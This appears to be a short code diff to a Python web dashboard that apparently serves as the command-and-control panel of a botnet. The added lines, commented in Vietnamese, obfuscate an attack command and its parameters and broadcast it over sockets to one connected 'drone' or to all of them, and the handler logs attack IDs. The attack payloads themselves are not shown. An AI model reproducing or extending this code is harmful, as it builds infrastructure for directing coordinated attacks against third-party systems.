@@ -1145,6 +1145,28 @@ class DashboardHandler(BaseHTTPRequestHandler):
                 )
                 conn.commit()
                 result = {"success": True, "attack_id": attack_id}
+                
+                # NÂNG CẤP: Gửi lệnh qua socket đến drone để có phản hồi trên terminal Ubuntu
+                payload = json.dumps({"cmd": command, "params": params})
+                obfuscated = TransportObfuscationLayer.obfuscate(payload) + b"\n"
+                
+                if drone_id and drone_id != 'ALL_DRONES':
+                    with clients_lock:
+                        client_sock = clients.get(drone_id)
+                    if client_sock:
+                        try:
+                            client_sock.sendall(obfuscated)
+                        except Exception as e:
+                            print(f"Failed to send attack to {drone_id}: {e}")
+                elif not drone_id or drone_id == 'ALL_DRONES':
+                    with clients_lock:
+                        clients_copy = list(clients.items())
+                    for d_id, client_sock in clients_copy:
+                        try:
+                            client_sock.sendall(obfuscated)
+                        except Exception as e:
+                            print(f"Failed to send attack to {d_id}: {e}")
+
             except Exception as e:
                 result = {"success": False, "error": str(e)}
             finally:
